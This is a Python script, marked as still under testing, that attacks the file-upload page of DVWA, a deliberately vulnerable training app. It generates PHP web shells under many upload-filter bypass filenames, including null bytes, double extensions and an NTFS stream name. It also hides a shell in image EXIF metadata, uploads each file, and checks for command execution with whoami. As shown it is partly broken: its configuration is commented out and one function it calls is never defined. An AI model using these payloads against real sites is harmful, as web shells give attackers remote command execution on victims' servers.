#testing uploadv2.py and mainv2.py, still under testing

#!/usr/bin/env python3
import requests
import os
import subprocess
import time
import urllib.parse

# Configuration for DVWA
# BASE_URL = "http://localhost/DVWA/"
# UPLOAD_URL = f"{BASE_URL}vulnerabilities/upload/" testing wordlist
# UPLOAD_DIR = f"{BASE_URL}hackable/uploads/" testing wordlist
# LOCAL_UPLOAD_PATH = "/var/www/html/DVWA/hackable/uploads/" testing wordlist
# COOKIE = {
#     'PHPSESSID': 'jtilroio40ftke9gn0qvqj17m1',
#     'security': 'medium'
# }
REPORT_FILENAME = "vuln_report.txt"

def embed_php_in_image(image_file, output_file):
    """Embed PHP payload inside an image metadata using exiftool."""
    payload = "<?php system($_REQUEST['cmd']); ?>"
    try:
        subprocess.run(["exiftool", f"-Comment={payload}", image_file, "-o", output_file], check=True)
        print(f"[+] Embedded PHP payload inside {output_file}")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error embedding payload: {e}")


def create_payloads():
    """Create PHP web shell payloads."""
    payloads = {
        "shell.php.jpg": "<?php system($_GET['cmd']); ?>",
        "shell.pHp5": "<?php system($_GET['cmd']); ?>",
        "shell.png.php": "<?php system($_GET['cmd']); ?>",
        "shell.php#.png": "<?php system($_GET['cmd']); ?>",
        "shell.php%20": "<?php system($_GET['cmd']); ?>",
        "shell.phpJunk123png": "<?php system($_GET['cmd']); ?>",
        "shell.png.jpg.php": "<?php system($_GET['cmd']); ?>",
        "shell.php%00.png": "<?php system($_GET['cmd']); ?>",
        "shell.php...": "<?php system($_GET['cmd']); ?>",
        "shell.php.png": "<?php system($_GET['cmd']); ?>",
        "shell.asp::$data": "<?php system($_GET['cmd']); ?>",
        "A" * 232 + ".php": "<?php system($_GET['cmd']); ?>",
        "shell.php%0a": "<?php system($_GET['cmd']); ?>",
        "shell.php%00": "<?php system($_GET['cmd']); ?>",
        "shell.php%0d%0a": "<?php system($_GET['cmd']); ?>",
        "shell.php#.png": "<?php system($_GET['cmd']); ?>",
        "shell.phpJunk123png": "<?php system($_GET['cmd']); ?>",
        "shell.png.jpg.php": "<?php system($_GET['cmd']); ?>",
        "shell.php%00.png%00.jpg": "<?php system($_GET['cmd']); ?>",
    }

    created_files = []
    for filename, content in payloads.items():
        try:
            with open(filename, 'w') as f:
                f.write(content)
            print(f"[+] Created payload: {filename}")
            created_files.append(filename)
        except Exception as e:
            print(f"[-] Error creating payload {filename}: {e}")

    # Embed PHP in an image
    embed_php_in_image("clean_image.jpg", "shell.jpg")
    created_files.append("shell.jpg")

    return created_files


def upload_files(payload_filenames):
    """Upload payloads and verify if they are uploaded successfully."""
    uploaded_files = []
    failed_files = []

    for filename in payload_filenames:
        data = {'Upload': 'Upload', 'MAX_FILE_SIZE': '100000'}
        mime_type = "image/png"
        files = {'uploaded': (filename, open(filename, 'rb'), mime_type)}

        try:
            print(f"[*] Uploading {filename} with MIME {mime_type}...")
            response = requests.post(UPLOAD_URL, files=files, data=data, cookies=COOKIE)

            if "successfully uploaded!" in response.text:
                print(f"[+] {filename} uploaded successfully (Response Confirmed)!")
                uploaded_files.append(filename)
                continue

            # Check if file exists in the upload directory
            time.sleep(1)
            upload_path = os.path.join(LOCAL_UPLOAD_PATH, filename)
            if os.path.exists(upload_path):
                print(f"[+] {filename} uploaded successfully (Found in directory)!")
                uploaded_files.append(filename)
            else:
                print(f"[-] Upload failed for {filename} (File not found in directory).")
                failed_files.append(filename)

        except Exception as e:
            print(f"[-] Upload error for {filename}: {str(e)}")
            failed_files.append(filename)

    return uploaded_files, failed_files


def test_uploaded_files(uploaded_files):
    """Check if uploaded files execute commands using ?cmd=whoami."""
    successful_executions = []

    for filename in uploaded_files:
        test_url = f"{UPLOAD_DIR}{filename}?cmd=whoami"
        try:
            print(f"[*] Testing execution: {test_url}")
            response = requests.get(test_url, cookies=COOKIE)

            if "www-data" in response.text:
                print(f"[+] Command execution successful for {filename}!")
                successful_executions.append(filename)
            else:
                print(f"[-] Command execution failed for {filename} (No www-data response).")

        except Exception as e:
            print(f"[-] Error testing {filename}: {str(e)}")

    return successful_executions

def try_upload_url(base_url, wordlist_file, cookie, payload_filename):
    """
    Try candidate upload URL paths from a wordlist until one succeeds.
    Lines starting with '#' are ignored.
    """
    with open(wordlist_file, "r") as f:
        candidate_paths = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
    for path in candidate_paths:
        upload_url = base_url + path
        print(f"[*] Trying upload URL: {upload_url}")
        if upload_file(upload_url, payload_filename, cookie):
            print(f"[+] Upload succeeded with URL: {upload_url}")
            return upload_url
    return None

def get_upload_directory(base_url, wordlist_file):
    """
    Read candidate upload directories from a wordlist and return the first one.
    Lines starting with '#' are ignored.
    """
    with open(wordlist_file, "r") as f:
        candidate_dirs = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
    for d in candidate_dirs:
        print(f"[*] Candidate upload directory: {base_url + d}")
    return base_url + candidate_dirs[0]
